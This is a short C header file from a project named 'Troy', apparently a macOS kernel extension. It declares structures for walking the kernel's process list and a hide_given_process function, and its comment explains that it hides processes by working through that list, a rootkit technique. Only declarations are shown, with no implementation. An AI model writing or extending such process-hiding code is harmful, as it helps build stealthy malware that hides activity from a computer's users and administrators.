//
//  HookCAPI.h
//  Troy
//
//  Created by Axis on 5/8/15.
//  Copyright (c) 2015 Axis. All rights reserved.
//

#ifndef __Troy__HookCAPI__
#define __Troy__HookCAPI__

#include "configure.h"

#define PROCESS_NAME_LENGTH 100+1
//attention:
//Althrough the struct proc have so many members, but for hiding the process,
//i only need the first memeber. If i get the first memeber, i will walk through
//all the prcess array.
struct	proc_yousemite
{
    LIST_ENTRY(proc_yousemite) p_list;
};

struct hide_proc
{
    struct proc_yousemite *proc;
    char name[PROCESS_NAME_LENGTH];
};
TAILQ_HEAD(hide_proc_list, hide_proc);

errno_t hide_given_process(troy_hide_object *process_hide);

#endif /* defined(__Troy__HookCAPI__) */
